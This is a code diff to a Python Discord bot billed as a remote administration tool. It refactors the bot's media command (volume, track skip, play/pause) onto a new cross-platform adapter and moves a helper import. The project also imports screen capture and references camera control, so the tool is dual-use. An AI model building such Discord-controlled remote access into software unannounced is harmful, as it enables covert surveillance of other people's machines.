@@ -18,14 +18,13 @@ from mss import mss
 # from lib.camera_control import CameraControl #commented because of the workaround
 
 # For using commands in different systems
-from helpers import get_operating
+from lib.helpers import get_operating
+
+# Dependency of media
+from lib.helpers import MediaControlAdapter
 
 # Platform name
 operating_sys = get_operating()
-
-# Dependency of media
-if operating_sys == "Windows":
-	from lib.input_commands import InputCommands
 
 # Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord",
@@ -235,19 +234,20 @@ async def say(txt):
 # Module: media
 # Description: Controls Media Features
 # Usage: !media command or !media command times
-# Dependencies: ctypes, time
+# Dependencies: pynput, time, helpers
 @client.command()
 async def media(command,times=1):
+	media_control = MediaControlAdapter(operating_sys)
 	if operating_sys == "Windows":
 		switcher = {
-			'vol-up':InputCommands.up_volume,
-			'vol-down':InputCommands.down_volume,
-			'vol-mute':InputCommands.mute_volume,
-			'next':InputCommands.media_next,
-			'prev':InputCommands.media_previous,
-			'stop':InputCommands.media_stop,
-			'play':InputCommands.media_play_pause,
-			'pause':InputCommands.media_play_pause
+			'vol-up':media_control.up_volume,
+			'vol-down':media_control.down_volume,
+			'vol-mute':media_control.mute_volume,
+			'next':media_control.media_next,
+			'prev':media_control.media_previous,
+			'stop':media_control.media_stop,
+			'play':media_control.media_play_pause,
+			'pause':media_control.media_play_pause
 			}
 		
 		for time in range(0,times):
